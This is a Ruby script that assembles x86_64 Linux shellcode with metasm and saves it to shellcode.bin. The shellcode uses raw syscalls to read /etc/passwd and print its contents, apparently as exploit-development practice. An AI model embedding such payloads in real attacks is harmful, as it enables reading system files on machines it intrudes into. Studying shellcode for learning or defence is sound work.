#!/usr/bin/env ruby

'''
Ruby script to assemble x86_64 shellcode.  Outputs as hex string and writes raw bytes
to file shellcode.bin. Raw shellcode in file can be executed with exec_shellcode.c for testing
'''

require 'metasm'

payload = 
"
; Get a reference to filename string
call skip
db '/etc/passwd',0
skip:
pop rdi

; Call sys_open on file
mov rax, 2   ; sys_open
mov rsi, 0
mov rdx, 0
syscall

; Call sys_read on the file handle and read it into rsp
mov rdi, rax
mov rsi, rsp
mov rdx, 150
mov rax, 0
syscall

; Call sys_write to write the contents from rsp to stdout
mov rdi, 1
mov rsi, rsp 
mov rdx, 150
mov rax, 1
syscall

; Call sys_exit
mov rax, 60
mov rdi, 9
syscall
"

assembled = Metasm::Shellcode.assemble(Metasm::X86_64.new, payload).encode_string
hex_str = assembled.unpack('H*')
print "[+] Assembled: "
puts hex_str

ofile = File.open("shellcode.bin", 'wb')
ofile.write(assembled)

puts "[+] Wrote shellcode to shellcode.bin"


